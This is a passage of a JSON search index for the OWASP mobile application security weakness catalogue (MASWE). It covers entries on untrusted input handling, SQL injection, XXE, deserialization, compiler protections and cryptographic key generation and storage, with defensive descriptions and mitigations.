hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0079</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0079/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Data received from the network should be treated as untrusted even if it is received over a secure channel.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0079/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>network</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0079/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0080/","title":"MASWE-0080: Unsafe Handling of Data from Backups","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0080</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0080/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app does not validate restored backup data, potentially accepting untrusted modifications alongside trusted data (CWE-349).</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0080/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>backup data validation</li> <li>backup data integrity</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0080/#references","title":"References","text":"<ul> <li>https://developer.android.com/guide/topics/data/keyvaluebackup#RestoreVersion</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0080/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0081/","title":"MASWE-0081: Unsafe Handling Of Data From External Interfaces","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0081</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0081/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>When data is received from external interfaces (e.g. Bluetooth, NFC, etc.), it should be treated as untrusted.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0081/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Bluetooth</li> <li>NFC</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0081/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0082/","title":"MASWE-0082: Unsafe Handling of Data From Local Storage","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0082</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0082/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>When data is read from local storage, it should be treated as untrusted.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0082/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Internal Storage</li> <li>External Storage</li> <li>UIDocumentPickerViewController used by the receiver app</li> <li>The app does not validate or sanitize input from local storage, which may lead to injection vulnerabilities when the data is interpreted or used in sensitive operations (CWE-20).</li> <li>The app does not validate or sanitize file paths read from local storage, enabling potential path traversal attacks (CWE-22).</li> <li>Paths to local files are influenced by attacker-controlled input, and their content can be modified (common in external storage or document pickers), leading to unintended file access or tampering (CWE-73).</li> <li>The app processes data from local storage as if it were inherently trustworthy, without isolating or verifying it, allowing attackers to alter app state or behavior (CWE-349).</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0082/#references","title":"References","text":"<ul> <li>https://developer.android.com/topic/security/risks/path-traversal</li> <li>https://developer.android.com/topic/security/risks/zip-path-traversal</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0082/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0083/","title":"MASWE-0083: Unsafe Handling of Data From The User Interface","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0083</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0083/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. text fields, QR codes, URLs, pasteboard, etc.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0083/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>text Fields</li> <li>QR Codes</li> <li>URLs</li> <li>Pasteboard</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0083/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0026 - Testing Implicit Intents (android)</li> <li>MASTG-TEST-0002 - Testing Local Storage for Input Validation (android)</li> <li>MASTG-TEST-0027 - Testing for URL Loading in WebViews (android)</li> <li>MASTG-TEST-0025 - Testing for Injection Flaws (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0084/","title":"MASWE-0084: Unsafe Handling of Data from IPC","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0084</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0084/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. received intents, broadcast receivers, URL validation, URL schemes, etc.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0084/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>The app does not validate or sanitize input received through inter-process communication channels (e.g., intents, content URIs, broadcast receivers), which may lead to injection or logic vulnerabilities when the data is used in sensitive operations (CWE-20).</li> <li>The app assumes that data received from other apps via IPC is trustworthy, without verifying its authenticity or origin (CWE-345).</li> <li>The app combines untrusted IPC data with trusted inputs or internal state, which may allow attackers to influence app behavior or corrupt logic flows (CWE-349).</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0084/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0026 - Testing Implicit Intents (android)</li> <li>MASTG-TEST-0002 - Testing Local Storage for Input Validation (android)</li> <li>MASTG-TEST-0027 - Testing for URL Loading in WebViews (android)</li> <li>MASTG-TEST-0025 - Testing for Injection Flaws (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0085/","title":"MASWE-0085: Unsafe Dynamic Code Loading","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0085</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0085/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. when using dlopen, DexClassLoader, etc.</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0085/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>dlopen</li> <li>DexClassLoader</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0085/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0086/","title":"MASWE-0086: SQL Injection","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0086</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0086/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. prepared statements with variable binding (i.e. parameterized queries)</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0086/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>not using prepared statements</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0086/#references","title":"References","text":"<ul> <li>https://developer.android.com/topic/security/risks/sql-injection</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0086/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0087/","title":"MASWE-0087: Insecure Parsing and Escaping","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0087</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0087/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. XML External Entity (XXE) attacks, X509 certificate parsing, character escaping.</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0087/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>The app does not properly escape or encode special characters when handling structured output formats (e.g., HTML, XML, JSON), which may lead to injection or rendering issues in downstream components (CWE-116).</li> <li>The app parses XML input without restricting external entity resolution, allowing XML External Entity (XXE) attacks that can expose files, initiate SSRF, or disrupt app logic (CWE-611).</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0087/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0088/","title":"MASWE-0088: Insecure Object Deserialization","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0088</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0088/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. XML, JSON, java.io.Serializable, Parcelable on Android or NSCoding on iOS.</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0088/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>XML</li> <li>JSON</li> <li>java.io.Serializable</li> <li>Parcelable</li> <li>NSCoding</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0088/#references","title":"References","text":"<ul> <li>https://i.blackhat.com/EU-22/Wednesday-Briefings/EU-22-Ke-Android-Parcels-Introducing-Android-Safer-Parcel.pdf</li> <li>https://github.com/michalbednarski/ReparcelBug2</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</li> <li>https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0088/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0116/","title":"MASWE-0116: Compiler Provided Security Features Not Used","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0116</p>","tags":["android","ios","L2","maswe","masvs-code-3","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0116/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app is compiled without enabling memory protection mechanisms such as stack canaries, address space layout randomization (ASLR), non-executable memory, or position-independent executables (PIE), reducing resistance to memory corruption attacks (CWE-693).</p> <p>Note: PIC cannot be switched off in newer versions of Android, the NDK does not link against such libraries anymore source. Alternative title could be Memory Anti-Exploitation Mechanisms Not Implemented.</p>","tags":["android","ios","L2","maswe","masvs-code-3","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0116/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>PIC</li> <li>stack canaries</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-3","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0116/#references","title":"References","text":"<ul> <li>https://cs.android.com/android/platform/superproject/main/+/main:bionic/linker/linker_main.cpp;l=397?q=linker_main&amp;ss=android%2Fplatform%2Fsuperproject%2Fmain</li> <li>https://partners.trellix.com/enterprise/en-us/assets/white-papers/wp-secure-coding-android-applications.pdf</li> <li>https://mas.owasp.org/MASTG/0x05i-Testing-Code-Quality-and-Build-Settings/#binary-protection-mechanisms</li> <li>https://mas.owasp.org/MASTG/0x06i-Testing-Code-Quality-and-Build-Settings/#binary-protection-mechanisms</li> <li>https://sensepost.com/blog/2021/on-ios-binary-protections/</li> <li>https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-3","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0116/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-code-3","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0116/#tests","title":"Tests","text":"<p> MASTG-TEST-0223: Stack Canaries Not Enabled  MASTG-TEST-0222: Position Independent Code (PIC) Not Enabled  MASTG-TEST-0230: Automatic Reference Counting (ARC) not enabled  MASTG-TEST-0229: Stack Canaries Not enabled  MASTG-TEST-0228: Position Independent Code (PIC) not Enabled </p>","tags":["android","ios","L2","maswe","masvs-code-3","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0009/","title":"MASWE-0009: Improper Cryptographic Key Generation","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0009/#overview","title":"Overview","text":"<p>In cryptography, the security strength is heavily influenced by the methods used to generate cryptographic keys. One critical aspect is the key size, also known as the key length, which is measured in bits and must comply with the latest security best practices. Encryption algorithms that use insufficient key sizes are vulnerable to attack, while longer keys typically result in more complex encryption.</p> <p>However, even with a sufficiently large key size, the security of the encryption can be compromised if the key generation process is flawed. Failing to use strong, cryptographically secure pseudorandom number generators (CSPRNGs) with sufficient entropy can generate predictable keys that are easier for attackers to guess or reproduce and that are susceptible to repetitive patterns.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0009/#impact","title":"Impact","text":"<ul> <li>Risk of Brute-Force Attacks: Improper key generation, whether due to shorter key length or predictable random number generator (PRNG) inputs, increases the risk of brute-force attacks. Attackers can more easily guess or systematically try possible keys until they find the correct one.</li> <li>Loss of Confidentiality: Encryption relies on strong keys to maintain the confidentiality of sensitive data. Seed values with insufficient entropy can allow attackers to decrypt and access confidential information, leading to unauthorized disclosure and potential data breaches.</li> <li>Loss of Integrity: Improper key generation can compromise data integrity, allowing attackers to exploit vulnerabilities and potentially alter or tamper with the information without detection.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0009/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Insufficient Entropy: Using a source of randomness with insufficient entropy can lead to predictable cryptographic keys.</li> <li>Insufficient Key Length: Cryptographic keys that are too short provide inadequate security. For example, keys shorter than recommended lengths for modern algorithms may be vulnerable to brute force attacks, making them easier for attackers to break.</li> <li>Using Risky or Broken Algorithms: Relying on deprecated, risky or inherently broken cryptographic algorithms can result in the generation of weaker keys. As these algorithms often have vulnerabilities or support shorter key lengths, they are more susceptible to modern attacks, compromising the overall security of the app.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0009/#mitigations","title":"Mitigations","text":"<ul> <li>Always use modern, well-established cryptographic libraries and APIs that follow best practices for entropy generation and key management.</li> <li>Ensure that key lengths meet or exceed current standards for cryptographic security, such as 256-bit for AES encryption and 2048-bit for RSA (considering quantum computing attacks). See \"NIST Special Publication 800-57: Recommendation for Key Management: Part 1 \u2013 General\" and \"NIST Special Publication 800-131A: Transitioning the Use of Cryptographic Algorithms and Key Lengths\" and \"BlueKrypt's Cryptographic Key Length Recommendation\" for more information on cryptographic key sizes.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0009/#tests","title":"Tests","text":"<p> MASTG-TEST-0208: Insufficient Key Sizes  MASTG-TEST-0209: Insufficient Key Sizes </p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0010/","title":"MASWE-0010: Improper Cryptographic Key Derivation","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0010</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0010/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. PBKDF2 with insufficient iterations, lack of salt, etc.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0010/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>sources with insufficient entropy</li> <li>lack of salt encryption when doing PBKDF2</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0010/#references","title":"References","text":"<ul> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0010/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0014 - Testing the Configuration of Cryptographic Standard Algorithms (android)</li> <li>MASTG-TEST-0061 - Verifying the Configuration of Cryptographic Standard Algorithms (ios)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0011/","title":"MASWE-0011: Cryptographic Key Rotation Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0011</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0011/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Key rotation is a best practice to limit the impact of a key compromise. It is especially important for long-lived keys such as asymmetric keys.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0011/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>long-lived keys (cryptoperiods as per NIST.SP.800-57pt1r5)</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0011/#references","title":"References","text":"<ul> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf</li> <li>https://developers.google.com/tink/managing-key-rotation</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0011/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0012/","title":"MASWE-0012: Insecure or Wrong Usage of Cryptographic Key","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0012</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0012/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>According to NIST.SP.800-57pt1r5, in general, a single key shall be used for only one purpose (e.g., encryption, integrity, authentication, key wrapping, random bit generation, or digital signatures)</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0012/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>key used together with an authorized algorithm</li> <li>key reuse for different purposes or operations (encrypt, decrypt, sign,...)</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0012/#references","title":"References","text":"<ul> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0012/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0015 - Testing the Purposes of Keys (android)</li> <li>MASTG-TEST-0062 - Testing Key Management (ios)</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0013/","title":"MASWE-0013: Hardcoded Cryptographic Keys in Use","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Deprecated Weakness</p> <p>This weakness is deprecated and should not be used anymore. Reason: Content overlap.</p> <p>Please check the following MASTG v2 weaknesses that cover this v1 weakness:</p> <ul> <li> Cryptographic Keys Not Properly Protected at Rest</li> </ul>","tags":["android","ios","maswe","masvs-crypto-2","deprecated"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0014/","title":"MASWE-0014: Cryptographic Keys Not Properly Protected at Rest","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","masvs-storage-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0014/#overview","title":"Overview","text":"<p>Cryptographic keys are essential for securing sensitive data in mobile applications. However, if these keys are not properly protected at rest, they can be easily compromised. This weakness involves storing cryptographic keys in insecure locations, such as unencrypted SharedPreferences, unprotected files, hardcoding them within the application code, or including them in source control and versioning systems which may end in the final application package in production.</p> <p>Attackers can decompile or reverse-engineer the app to extract hardcoded keys.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","masvs-storage-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0014/#impact","title":"Impact","text":"<ul> <li>Unauthorized Access: If cryptographic keys are not properly protected, attackers may gain unauthorized access to sensitive data and potential identity theft.</li> <li>Loss of Integrity: Compromised keys can allow attackers to tamper with encrypted data.</li> <li>Loss of Confidentiality: Sensitive information can be exposed, resulting in a loss of confidentiality. Once keys are exposed, all data encrypted with those keys is at risk.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","masvs-storage-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0014/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Insecure Storage Locations: Storing cryptographic keys in unencrypted SharedPreferences, unprotected files, or other insecure locations.</li> <li>Hardcoded Keys: Including cryptographic keys directly in the application code, making them susceptible to extraction through decompilation and reverse-engineering.</li> <li>Lack of Encryption: Exporting cryptographic keys in plain text without encrypting them using a secure method.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","masvs-storage-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0014/#mitigations","title":"Mitigations","text":"<ul> <li>Use Platform Keystores: Where possible, generate cryptographic keys dynamically on the device, rather than using predefined keys, and ensure that they are securely stored after creation. For this you can use the platform-specific keystores, such as the Android KeyStore or iOS KeyChain.</li> <li>Implement Strongest Hardware Security Solutions: For the most critical cases and whenever available and compatible for the use case at hand, leverage the strongest hardware-backed security options such as Android StrongBox or iOS's Secure Enclave <code>kSecAttrTokenIDSecureEnclave</code> option to ensure the highest protection including physical and side-channel attacks.</li> <li>Use Cryptographic Key Management Systems: Securely retrieve keys from server-side services that provide secure storage, access control, and auditing for 